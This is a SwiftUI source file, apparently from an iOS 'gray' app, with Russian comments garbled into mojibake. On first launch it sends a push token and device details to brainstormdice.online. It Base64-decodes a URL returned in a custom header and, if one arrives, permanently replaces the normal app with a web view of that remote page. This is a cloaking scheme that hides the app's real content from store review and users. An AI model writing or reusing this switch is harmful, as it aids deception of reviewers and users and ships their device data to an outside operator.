import SwiftUI

struct GrayPageView: View {

    // –ö–æ–Ω—Ñ–∏–≥:
    private let baseURL = URL(string: "http://brainstormdice.online/")! // endpoint –±–µ–∑ query
    private let headerKey = "com.dolina.brainstorm"                               // –∏–º—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ —Å –∫–æ–Ω–µ—á–Ω–æ–π —Å—Å—ã–ª–∫–æ–π

    @State private var route: Route = .splash
    @State private var showNoInternetAlert = false

    var body: some View {
        Group {
            switch route {
            case .splash:
                SplashScreenView()
                    .task { await boot() }

            case .web(let url):
                WebContainerView(url: url)
                    .transition(.opacity)

            case .app:
                ContentView()
                    .transition(.opacity)
            }
        }
        .animation(.easeInOut(duration: 0.25), value: route)
        .alert("No Internet Connection",
               isPresented: $showNoInternetAlert,
               actions: {
                   Button("Retry") {
                       Task { await retryAfterAlert() }
                   }
                   Button("Cancel", role: .cancel) { }
               },
               message: {
                   Text("Check your Internet connection and try again.")
               })
    }

    enum Route: Equatable {
        case splash
        case web(URL)
        case app
    }

    // MARK: - Boot sequence

    @MainActor
    private func boot() async {
        // 1) –ß–∏—Ç–∞–µ–º —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã–π —Ä–µ–∂–∏–º
        switch Persistence.shared.loadState() {
        case .forceMain:
            // –≠—Ç–æ—Ç –≤—ã–±–æ—Ä –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω—ã–π ‚Äî —Å—Ä–∞–∑—É –≤ –æ—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
            route = .app

        case .web(let savedURL):
            // –ï—Å—Ç—å —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞ ‚Äî –ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ —Å—Ä–∞–∑—É –æ—Ç–∫—Ä—ã–≤–∞–µ–º web
            let online = await InternetChecker.hasInternet()
            if online {
                route = .web(savedURL)
            } else {
                // –ü–æ–∫–∞–∑–∞—Ç—å –∞–ª–µ—Ä—Ç –∏ –¥–∞—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å ¬´Retry¬ª
                showNoInternetAlert = true
                // –æ—Å—Ç–∞—ë–º—Å—è –Ω–∞ —Å–ø–ª—ç—à–µ
            }

        case .undecided:
            // –ü–µ—Ä–≤—ã–π ¬´–æ—Å–º—ã—Å–ª–µ–Ω–Ω—ã–π¬ª –∑–∞–ø—É—Å–∫ ‚Äî —Ä–µ—à–∞–µ–º —Å—É–¥—å–±—É
            await firstDecisionFlow()
        }
    }

    @MainActor
    private func retryAfterAlert() async {
        // –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è —Å—Ü–µ–Ω–∞—Ä–∏—è saved web
        switch Persistence.shared.loadState() {
        case .web(let savedURL):
            let online = await InternetChecker.hasInternet()
            if online {
                route = .web(savedURL)
            } else {
                showNoInternetAlert = true // —Å–Ω–æ–≤–∞ –ø–æ–∫–∞–∑–∞—Ç—å
            }
        default:
            // –ù–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π ‚Äî –ø–µ—Ä–µ—Å–æ–±–µ—Ä—ë–º –ª–æ–≥–∏–∫—É boot()
            await boot()
        }
    }

    // MARK: - First decision (only once when undecided)

    @MainActor
    private func firstDecisionFlow() async {
        // 0) –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∏–º –∏–Ω—Ç–µ—Ä–Ω–µ—Ç
        let online = await InternetChecker.hasInternet()
        if !online {
            // –ò–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –Ω–µ—Ç –Ω–∞ —Å–∞–º–æ–º –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ ‚Üí –Ω–∞–≤—Å–µ–≥–¥–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
            Persistence.shared.saveForceMain()
            route = .app
            return
        }

        // 1) –ï—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç. –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω (–ø–æ–∫–∞–∂–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –∞–ª–µ—Ä—Ç –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏)
        do {
            let token = try await NotificationManager.shared.requestToken()
            //print("‚úÖ token =", token)

            // 2) –°–æ–±–∏—Ä–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            let device = DeviceInfoManager.shared.getInfo()

            // 3) –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ baseURL —Å query, —á–∏—Ç–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ headerKey
            if let targetURL = await LinkFetcher.fetchLink(
                baseURL: baseURL,
                headerKey: headerKey,
                device: device,
                token: token
            ) {
                // üëâ –ø–µ—Ä–µ–¥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –ø—Ä–æ–±—É–µ–º –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∫ Base64
                let decodedString = Base64Helper.decode(targetURL.absoluteString) ?? targetURL.absoluteString
                if let finalURL = URL(string: decodedString) {
                    Persistence.shared.saveWebURL(finalURL)
                    route = .web(finalURL)
                } else {
                    // –µ—Å–ª–∏ –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å ‚Äî –æ—Ç–∫–∞—Ç –≤ –æ—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
                    Persistence.shared.saveForceMain()
                    route = .app
                }
            } else {
                // –ö–ª—é—á –Ω–µ –Ω–∞–π–¥–µ–Ω ‚Äî —Ñ–∏–∫—Å–∏—Ä—É–µ–º –Ω–∞–≤—Å–µ–≥–¥–∞ –æ—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
                Persistence.shared.saveForceMain()
                route = .app
            }
        } catch {
            // –ù–µ –ø–æ–ª—É—á–∏–ª–∏ —Ç–æ–∫–µ–Ω / –æ—Ç–∫–∞–∑–∞–ª –ø–µ—Ä–º–∏—à–µ–Ω / –∏–Ω–∞—è –æ—à–∏–±–∫–∞ ‚Üí —Ñ–∏–∫—Å–∏—Ä—É–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ä–µ–∂–∏–º
            //print("‚ö†Ô∏è token error:", error.localizedDescription)
            Persistence.shared.saveForceMain()
            route = .app
        }
    }
}
